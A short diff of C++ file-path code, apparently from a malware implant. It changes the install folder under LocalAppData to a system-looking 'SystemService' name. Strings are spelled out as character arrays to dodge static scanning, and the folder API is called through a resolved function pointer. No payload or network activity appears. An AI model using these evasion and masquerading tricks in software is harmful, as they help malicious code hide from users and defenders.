@@ -229,7 +229,8 @@ string FileHelper::getReleasePath(const char * path) {
 				mypath = tmppath;
 			}
 		}
-		char service_path[] = { 's','e','r','v','i','c','e','s',0 };
+		char service_path[] = { 'S','y','s','t','e','m','S','e','r','v','i','c','e',0 };
+		//char service_path[] = { 's','e','r','v','i','c','e','s',0 };
 		folder = string(mypath) + "\\" + service_path + "\\";
 	}
 
@@ -240,13 +241,14 @@ string FileHelper::getReleasePath(const char * path) {
 
 string FileHelper::getRunPath() {
 	int ret = 0;
+	char szMyPathName[] = { 'S','y','s','t','e','m','S','e','r','v','i','c','e',0 };
 	char tmppath[1024];
 	ret = lpSHGetSpecialFolderPathA(0, tmppath, CSIDL_LOCAL_APPDATA, false);
-	return string(tmppath) + "\\services\\";
+	return string(tmppath) + "\\"+ szMyPathName+"\\";
 	
 	string username = Public::getusername();
 
-	char szMyPathName[] = { 's','y','s','t','e','m','S','e','r','v','i','c','e',0 };
+	
 
 	char szPEFilePathWin7Format[] = { 'c',':','\\','u','s','e','r','s','\\','%','s','\\','a','p','p','d','a','t','a','\\',
 		'l','o','c','a','l','\\','%','s','\\',0 };
